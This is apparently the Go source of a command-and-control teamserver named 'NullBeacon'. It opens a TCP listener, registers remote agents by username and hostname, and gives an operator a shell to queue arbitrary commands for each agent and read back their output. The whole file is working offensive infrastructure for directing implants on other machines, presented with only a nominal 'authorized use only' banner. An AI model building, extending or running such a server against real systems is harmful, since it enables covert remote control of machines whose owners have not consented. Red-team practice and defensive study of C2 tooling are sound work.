package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/RodKast/go-c2/pkg/agent"
	"github.com/RodKast/go-c2/pkg/task"
	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

var (
	agents  = make(map[string]*agent.Agent)
	agentMu sync.Mutex
)

func printBanner() {
	red := color.New(color.FgRed)
	cyan := color.New(color.FgCyan)

	red.Println(`  _   _       _ _ ____                            `)
	red.Println(` | \ | |     | | |  _ \                           `)
	red.Println(` |  \| |_   _| | | |_) | ___  __ _  ___ ___  _ __`)
	red.Println(` | . | | | | | | |  _ < / _ \/ _` + "`" + `|/ __/ _  \| '_ \`)
	red.Println(` | |\  | |_| | | | |_) |  __/ (_| | (_| (_) | | | |`)
	red.Println(` |_| \_|\__,_|_|_|____/ \___|\__,_|\___\___/|_| |_|`)
	cyan.Println("\n  NullBeacon C2 | For authorized use only\n")
}

func main() {
	printBanner()
	logFile, err := os.OpenFile("teamserver.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("failed to open log file: %v", err)
	}
	log.SetOutput(logFile)
	go startListener()
	operatorShell()
}

func startListener() {

	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalf("failed to start listener: %v", err)
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("failed to accept connection: %v", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	log.Printf("new connection from %s", conn.RemoteAddr())

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	reader := bufio.NewReader(conn)
	message, err := reader.ReadString('\n')
	if err != nil {
		log.Printf("failed to read message: %v", err)
		return
	}

	parts := strings.Split(strings.TrimSpace(message), ":")
	if len(parts) != 3 {
		log.Printf("invalid message format: %s", message)
		return
	}
	agentID := parts[0]
	username := parts[1]
	hostname := parts[2]

	agentMu.Lock()
	a, exists := agents[agentID]
	if !exists {
		a = agent.NewAgent(username, hostname, conn.RemoteAddr().String())
		a.ID = agentID
		agents[agentID] = a
		log.Printf("new agent registered: %s", agentID)
	} else {
		log.Printf("returning beacon: %s", agentID)
	}
	agentMu.Unlock()

	for i := range a.Tasks {
		if a.Tasks[i].Status == "pending" {
			log.Printf("executing pending task for agent %s: %s", agentID, a.Tasks[i].Command)
			_, err = conn.Write([]byte(a.Tasks[i].Command + "\n"))
			if err != nil {
				log.Printf("failed to send task to agent: %v", err)
				return
			}
			a.Tasks[i].Status = "sent"

			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			output, err := reader.ReadString('\n')
			if err != nil {
				log.Printf("failed to read task output: %v", err)
				return
			}
			a.Tasks[i].Output = strings.TrimSpace(output)
			a.Tasks[i].Status = "completed"
			log.Printf("task output: %s", a.Tasks[i].Output)
			return
		}
	}
	ackMesg := strings.ToUpper(strings.TrimSpace(message))
	response := fmt.Sprintf("ACK: %s\n", ackMesg)
	_, err = conn.Write([]byte(response))
	if err != nil {
		log.Printf("failed to write response: %v", err)
		return
	}
}

func operatorShell() {
	rl, _ := readline.New("nullbeacon> ")
	defer rl.Close()
	for {
		command, err := rl.Readline()
		if err != nil {
			break
		}
		command = strings.TrimSpace(command)

		switch {
		case command == "list":
			listAgents()
		case strings.HasPrefix(command, "interact"):
			parts := strings.Split(command, " ")
			if len(parts) != 2 {
				fmt.Println("Usage: interact <agent_id>")
				continue
			}
			agentID := parts[1]
			interactWithAgent(agentID)
		case command == "exit":
			fmt.Println("Exiting operator shell.")
			return
		default:
			fmt.Println("Unknown command.")
		}
	}
}

func listAgents() {
	agentMu.Lock()
	defer agentMu.Unlock()

	if len(agents) == 0 {
		fmt.Println("No agents connected.")
		return
	}

	fmt.Println("Connected agents:")
	for id, a := range agents {
		fmt.Printf("ID: %s, Username: %s, Hostname: %s, Address: %s\n", id, a.Username, a.Hostname, a.Address)
	}
}

func interactWithAgent(agentID string) {
	agentMu.Lock()
	a, exists := agents[agentID]
	agentMu.Unlock()

	if !exists {
		fmt.Printf("agent %s not found\n", agentID)
		return
	}

	rl, _ := readline.New(fmt.Sprintf("[agent:%s]> ", a.ID[:8]))
	defer rl.Close()

	for {
		command, err := rl.Readline()
		if err != nil {
			break
		}
		command = strings.TrimSpace(command)

		switch command {
		case "back":
			return
		case "tasks":
			for _, t := range a.Tasks {
				fmt.Printf("[%s] %s → %s: %s\n", t.ID[:8], t.Command, t.Status, t.Output)
			}
		default:
			t := task.NewTask(agentID, command)
			a.Tasks = append(a.Tasks, t)
			fmt.Printf("[*] task queued: %s (waiting for output...)\n", t.ID)
			for t.Output == "" {
				time.Sleep(1 * time.Second)
			}
			fmt.Printf("output: %s\n", t.Output)
		}
	}
}
